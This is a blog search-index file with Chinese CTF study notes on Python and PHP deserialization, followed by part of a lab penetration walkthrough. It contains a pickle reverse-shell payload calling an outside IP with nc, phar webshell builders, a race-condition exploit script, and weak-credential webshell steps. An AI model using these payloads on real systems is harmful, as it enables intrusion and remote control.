<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>反序列化进阶</title>
    <link href="/2025/10/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9B%E9%98%B6/"/>
    <url>/2025/10/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9B%E9%98%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="反序列化进阶"><a href="#反序列化进阶" class="headerlink" title="反序列化进阶"></a>反序列化进阶</h1><h1 id="1-python"><a href="#1-python" class="headerlink" title="1.python"></a>1.python</h1><h2 id="requests库"><a href="#requests库" class="headerlink" title="requests库"></a>requests库</h2><p>可以写一些简单的攻击脚本了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> res<br><span class="hljs-keyword">import</span> base64<br>url=<span class="hljs-string">&quot;http://117.72.52.127:12167/&quot;</span><br><span class="hljs-comment"># r1=res.get(url=url,params=&#123;&quot;a&quot;:123,&quot;b&quot;:456&#125;)  无会话状态</span><br><span class="hljs-comment"># r2=res.post(url=url,data=&#123;&quot;a&quot;:123,&quot;b&quot;:456&#125;或者json=&#123;&#125;)  注意传参使用字典的形式传参</span><br>s=res.Session()<br><span class="hljs-comment"># 先实例化一个会话类</span><br>r1=s.get(url)<br>value=base64.b64decode(base64.b64decode(r1.headers[<span class="hljs-string">&#x27;Flag&#x27;</span>]).split(<span class="hljs-string">b&quot;:&quot;</span>)[<span class="hljs-number">1</span>])<br>r2=s.post(url,data=&#123;<span class="hljs-string">&#x27;margin&#x27;</span>:value&#125;)<br><span class="hljs-built_in">print</span>(r2.text)<br><span class="hljs-comment"># 在会话状态下的请求更加合理，注意是直接填写url</span><br></code></pre></td></tr></table></figure><h2 id="pickle反序列化"><a href="#pickle反序列化" class="headerlink" title="pickle反序列化"></a>pickle反序列化</h2><p>pickle.dumps 序列化</p><p>pickle.loads 反序列化</p><p>关键在于对python里面的类反序列化时会触发__reduce__方法，可以在__reduce__方法里面构造恶意代码(类似于php里面的wakeup方法)</p><p>利用pickle反序列化实现反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">a</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>,(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;nc 113.45.176.xxx 900 -e /bin/sh&#x27;).read()&quot;</span>,))  <span class="hljs-comment">#,保证传给eval的是一个元组</span><br><br>m=a()<br>b=pickle.dumps(m)<br><span class="hljs-built_in">print</span>(b)<br><span class="hljs-built_in">print</span>(base64.b64encode(b))<br></code></pre></td></tr></table></figure><h1 id="2-反序列化"><a href="#2-反序列化" class="headerlink" title="2.反序列化"></a>2.反序列化</h1><h2 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h2><p>偶然间发现一个反序列化的靶场</p><p><a href="https://github.com/BoyArmey/unserialize">https://github.com/BoyArmey/unserialize</a></p><p><img src="/../php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1761320363845-31.png" alt="img"></p><p>加强了对魔术方法的学习</p><h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h3><p>1.属性有三类   </p><p>​             public   公有的</p><p>​             private  私有的  只可以在子类访问，不能在类的外面访问</p><p>​             protected  保护的  在子类和类的外面都不能访问</p><p>反序列化后的结果是一个对象</p><p>反序列化后生成的对象中的属性值与反序列化里的值保持一致。与原来类中的属性默认值无关。</p><p>除了魔术方法，反序列化不会直接执行类中的成员方法，需要调用后才会执行。</p><ol><li>由于存在private和protected修饰的成员属性，因此序列化的结果中包含空字符，因此将空字符替换为%00。</li></ol><p>由于%00的存在，因此还需要进行url解码，使用urldecode()进行解码操作。</p><p>将解码后的$deurl_ser_dog进行反序列化操作，使用unserialize()函数实现。</p><p>使用var_dump()函数输出反序列化后的结果。</p><p>3.魔术方法：预先定义好的，在某些特定情况下自动触发的方法（函数）。</p><p>  简单讲：做事件A之前会自动触发事件B执行，比如张嘴吃东西，如果要吃东西必定会触发张嘴的动作。</p><p>  魔术方法的作用</p><p>  正常作用：在对类进行实例化、销毁等操作时，自动进行一些处理操作。</p><p>  非法作用：魔术方法会在特定条件下调用相关方法，导致触发构造好的恶意代码</p><h3 id="魔术方法："><a href="#魔术方法：" class="headerlink" title="魔术方法："></a>魔术方法：</h3><p>1.__construct</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Animal</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;构造函数被触发&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;name;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$animal</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Animal</span>(<span class="hljs-string">&quot;狗&quot;</span>); <span class="hljs-comment">//           实例化一个类，new一个对象就会触发construct</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>2.__destruct</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Animal</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;析构函数被触发&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$animal</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Animal</span>(); <span class="hljs-comment">// 触发析构函数</span><br><span class="hljs-variable">$$ser_animal</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$$animal</span>);<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser_animal</span>);  <span class="hljs-comment">// 触发析构函数</span><br><br><span class="hljs-variable">$$animal</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Animal</span>();<span class="hljs-comment">//不是在声明对象时触发的析构函数，而是$$animal销毁时触发了析构函数</span><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser_aimal</span>)<span class="hljs-comment">//是将字符串反序列化为对象，其结果也是一个对象，在对象销毁时，也会触发析构函数  </span><br>        <span class="hljs-comment">//实例化一个类，反序列化会触发（都会产生一个新的对象，对象销毁时会触发）destruct</span><br></code></pre></td></tr></table></figure><p>3.__sleep</p><p>__sleep()函数触发时机：序列化之前序列化函数serialize()函数会检查类中是否存在__sleep()魔术方法 如果存在，该方法会被优先调用，然后执行序列化操作</p><p>先执行__sleep()函数，然后再执行serialize()函数__sleep()函数可以用于清理对象，并返回一个数组，数组内容为对象中所有应该被序列化的变量的名称。</p><p>如果__sleep()没有返回任何内容，则NULL被序列化，并产生一个E_NOTICE级别的错误。 &#x2F;&#x2F;return array();</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Animal</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$price</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$age</span>,<span class="hljs-variable">$price</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = <span class="hljs-variable">$age</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;price = <span class="hljs-variable">$price</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;name);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$$info</span> = <span class="hljs-variable">$$_GET</span>[<span class="hljs-string">&#x27;info&#x27;</span>];<br><span class="hljs-variable">$$info</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$$info</span>);<br><span class="hljs-variable">$$animal</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Animal</span>(<span class="hljs-variable">$$info</span>-&gt;name,<span class="hljs-variable">$info</span>-&gt;age,<span class="hljs-variable">$info</span>-&gt;price);<br><span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$animal</span>);<br> <span class="hljs-comment">//将sleep删了构造name的payload</span><br></code></pre></td></tr></table></figure><p>4.__wakeup</p><p>unserialize()会检查是否存在__wakeup()方法。如果存在，则会先调用__wakeup()方法，准备对象需要的数据</p><p>先执行__wakeup()函数，再执行unserialize()函数</p><p>序列化之前执行sleep，反序列化之前执行wakeuo，反序列化之后执行destruct</p><p>5.__string</p><p>当对象被当作字符串使用时，触发__toString()函数自动执行</p><p>echo函数会将其当作字符串，而var_dump和print_r是当作对象输出</p><p>6.__invoke</p><p>把对象当作函数使用时，会自动触发__invoke()函数</p><p>$animal();,animal是一个对象</p><p>7.__call和__callstatic</p><p>__callStatic()函数在调用不可访问的静态方法时自动触发。与__call()函数相似。</p><p>__call：用于实例方法</p><p>__callStatic：用于静态方法函数原型：</p><p>静态方法调用：$animal::speak()</p><p>普通方法调用：$animal-&gt;speak()  属性也一样</p><p>8.__get和__set</p><p>get 针对调用不存在的属性  -&gt;</p><p>set 针对为不存在的属性赋值 &#x3D;</p><p>9.__isset和__unset</p><p>使用isset()函数或empty()函数访问类中不可访问的属性（私有属性），或不存在的属性时，会自动触发__isset()方法</p><p>使用unset()函数调用类中的不可访问属性$weight和不存在的属性$age时，自动触发__unset()方法</p><p>10.__clone</p><p>使用clone拷贝对象时，__clone()方法被调用</p><h2 id="Session-反序列化"><a href="#Session-反序列化" class="headerlink" title="Session 反序列化:"></a>Session 反序列化:</h2><p><img src="/../php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1761320363826-28.png" alt="img"></p><p>关键：对于php_serialize引擎来说’| ‘可能只是一个正常的字符；但对于php引擎来说’| ‘就是分隔符，前面是$_SESSION[‘username’]的键名，后面是GET参数经过serialize序列化后的值。从而在解析的时候造成了歧义，导致其在解析Session文件时直接对’ | ‘后的值进行反序列化处理。</p><p><strong>思路：一般是两个文件，一个文件是漏洞所在处，采用php处理器；另一个是session上传处，采用php_serialize处理器，则可利用php_serialize传入带有|的序列化payload，然后漏洞所在处用php处理器会直接对|后面的payload反序列化</strong></p><h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化:"></a>phar反序列化:</h2><p>参考教程:b站橙子科技</p><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识:"></a>前置知识:</h3><p><img src="/../php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1761320363826-29.png" alt="img"></p><p><img src="/../php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1761320363826-30.png" alt="img"></p><h3 id="有include的特殊用法"><a href="#有include的特殊用法" class="headerlink" title="有include的特殊用法:"></a>有include的特殊用法:</h3><p>还有一种存在文件包含的，可以直接上传一个压缩过的phar，然后在stub文件标识处写码实现rce，会默认解析该语句，但是一定要有phar这几个字母，才会当作phar去解压缩，识别了__HALT_COMPILER()就压缩绕过</p><p>如果可以使用phar:&#x2F;&#x2F;,就可以不用管后缀，.jpg也一样可以触发</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;test2.phar&#x27;</span>);  <span class="hljs-comment">//删除之前的test.phar文件(如果有)</span><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test3.phar&#x27;</span>);  <span class="hljs-comment">//创建一个phar对象，文件名必须以.phar为后缀</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php @eval($_POST[123]);__HALT_COMPILER();?&gt;&#x27;</span>);  <span class="hljs-comment">//写入stub</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>);  <span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-variable">$gz</span>=<span class="hljs-title function_ invoke__">gzopen</span>(<span class="hljs-string">&#x27;test3.phar.gz&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>);<br><span class="hljs-title function_ invoke__">gzwrite</span>(<span class="hljs-variable">$gz</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;test3.phar&#x27;</span>));<br><span class="hljs-title function_ invoke__">gzclose</span>(<span class="hljs-variable">$gz</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点:"></a>漏洞点:</h3><p>在于phar伪协议会对上传的phar文件自动的反序列化，然后manifest部分是一段可控的序列化数据，在使用php文件操作函数时，可以使用phar:&#x2F;&#x2F;去触发这个漏洞</p><h3 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h3><p>​         1.可以上传一个phar文件（后缀不重要，任意后缀均可触发）</p><p>​         2.要有在反序列化时可以触发的魔术方法，如__destruct,__wakeup</p><p>​         3.要有文件操作函数，且其参数可控，如file_exists,file_put_content.file_get_content</p><p>​         4.没有过滤:,&#x2F;,phar等phar伪协议的关键字符</p><h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Animal</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;name);<br>    &#125;<br>&#125;         <span class="hljs-comment">//根据实际填写类</span><br><br><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);  <span class="hljs-comment">//删除之前的test.phar文件(如果有)</span><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test1.phar&#x27;</span>);  <span class="hljs-comment">//创建一个phar对象，文件名必须以.phar为后缀</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();  <span class="hljs-comment">//开始写文件</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);  <span class="hljs-comment">//写入stub</span><br><span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Animal</span>(); <br><span class="hljs-variable">$o</span>-&gt;name=<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$_GET</span>[1]&quot;</span>);    <span class="hljs-comment">//可控点</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//写入meta-data</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;test.txt&#x27;</span>, <span class="hljs-string">&#x27;test&#x27;</span>);  <span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p> 注意要将php.ini中的readonly选项改成Off才能正常生成phar文件</p><p>Web 277 条件竞争加phar反序列化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> res<br><span class="hljs-keyword">import</span> threading <span class="hljs-keyword">as</span> th<br>url=<span class="hljs-string">&quot;https://7dd2e80f-f714-4e61-82bb-448d2368cf53.challenge.ctf.show/&quot;</span><br>found_flag=<span class="hljs-number">0</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">readfile</span>(<span class="hljs-params">file</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(file,<span class="hljs-string">&quot;rb&quot;</span>).read()<br>conent=readfile(<span class="hljs-string">&quot;my.phar&quot;</span>)<br><span class="hljs-comment"># print(conent)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    <span class="hljs-keyword">global</span> found_flag<br>    res.post(url=url+<span class="hljs-string">&quot;?fn=my.phar&quot;</span>,data=conent,verify=<span class="hljs-number">0</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>():<br>    <span class="hljs-keyword">global</span> found_flag<br>    a=res.post(url=url+<span class="hljs-string">&quot;?fn=phar://my.phar/&quot;</span>,data=<span class="hljs-string">&quot;1&quot;</span>,verify=<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ctfshow&quot;</span> <span class="hljs-keyword">in</span> a.text <span class="hljs-keyword">and</span> found_flag==<span class="hljs-number">0</span> :<br>        <span class="hljs-built_in">print</span>(a.text)<br>        found_flag=<span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> found_flag==<span class="hljs-number">0</span>:<br>    th.Thread(target=upload).start()<br>    th.Thread(target=read).start()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>春秋云镜之2022网鼎杯半决赛</title>
    <link href="/2025/10/25/%E6%B8%97%E9%80%8F/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/"/>
    <url>/2025/10/25/%E6%B8%97%E9%80%8F/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="春秋云镜之2022网鼎杯半决赛"><a href="#春秋云镜之2022网鼎杯半决赛" class="headerlink" title="春秋云镜之2022网鼎杯半决赛"></a>春秋云镜之2022网鼎杯半决赛</h1><p><strong>wordpress弱口令</strong></p><p><strong>永恒之蓝</strong></p><p><strong>RBCD</strong></p><p><strong>ADCS</strong></p><h2 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h2><p>首先是wordpress存在一个弱口令登录管理员后台</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">admin</span>/<span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure><p>然后有个插件的编辑功能，存在任意代码编写，写入一句话马</p><p><img src="D:\电脑管家迁移文件\xwechat_files\wxid_naboinczs1lc22_770a\temp\InputTemp\67a51020-c7a9-4cd8-a4c2-fb12c8cb4c94.png" alt="67a51020-c7a9-4cd8-a4c2-fb12c8cb4c94"></p><p>然后尝试拼接路径getshell</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">39.99</span>.<span class="hljs-number">133.128</span><span class="hljs-regexp">/wp-content/</span>plugins<span class="hljs-regexp">/akismet/i</span>ndex.php <br></code></pre></td></tr></table></figure><p>入口机拿下，并读取flag01</p><h2 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h2><p>传fscan，stowaway搭建内网代理</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.15.24:3306</span> open<br><span class="hljs-number">172.22.15.13:88</span> open<br><span class="hljs-number">172.22.15.18:80</span> open<br><span class="hljs-number">172.22.15.26:80</span> open<br><span class="hljs-number">172.22.15.26:22</span> open<br><span class="hljs-number">172.22.15.24:80</span> open<br><span class="hljs-number">172.22.15.13:445</span> open<br><span class="hljs-number">172.22.15.24:445</span> open<br><span class="hljs-number">172.22.15.18:445</span> open<br><span class="hljs-number">172.22.15.13:139</span> open<br><span class="hljs-number">172.22.15.24:139</span> open<br><span class="hljs-number">172.22.15.18:139</span> open<br><span class="hljs-number">172.22.15.35:139</span> open<br><span class="hljs-number">172.22.15.13:135</span> open<br><span class="hljs-number">172.22.15.24:135</span> open<br><span class="hljs-number">172.22.15.18:135</span> open<br><span class="hljs-number">172.22.15.35:135</span> open<br><span class="hljs-number">172.22.15.35:445</span> open<br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">24</span>       code:<span class="hljs-number">302</span> len:<span class="hljs-number">0</span>      title:None 跳转url: http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">24</span>/www<br><span class="hljs-string">[*]</span> OsInfo <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">13</span>        (Windows Server <span class="hljs-number">2016</span> Standard <span class="hljs-number">14393</span>)<br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">18</span>       code:<span class="hljs-number">200</span> len:<span class="hljs-number">703</span>    title:IIS Windows Server<br><span class="hljs-string">[*]</span> NetBios <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">13</span>    <span class="hljs-string">[+]</span> DC:XR-DC01.xiaorang.lab          Windows Server <span class="hljs-number">2016</span> Standard <span class="hljs-number">14393</span><br><span class="hljs-string">[*]</span> NetInfo <br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">24</span><br>   <span class="hljs-string">[-&gt;]</span>XR-WIN08<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">24</span><br><span class="hljs-string">[*]</span> NetInfo <br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">18</span><br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">35</span><br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">18</span><br><span class="hljs-string">[+]</span> MS17-<span class="hljs-number">010</span> <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">24</span>        (Windows Server <span class="hljs-number">2008</span> R2 Enterprise <span class="hljs-number">7601</span> Service Pack <span class="hljs-number">1</span>)<br><span class="hljs-string">[*]</span> NetBios <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">35</span>    XIAORANG\XR-<span class="hljs-number">0687</span>              <br><span class="hljs-string">[*]</span> NetInfo <br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">35</span><br>   <span class="hljs-string">[-&gt;]</span>XR-<span class="hljs-number">0687</span><br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">35</span><br><span class="hljs-string">[*]</span> NetInfo <br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span 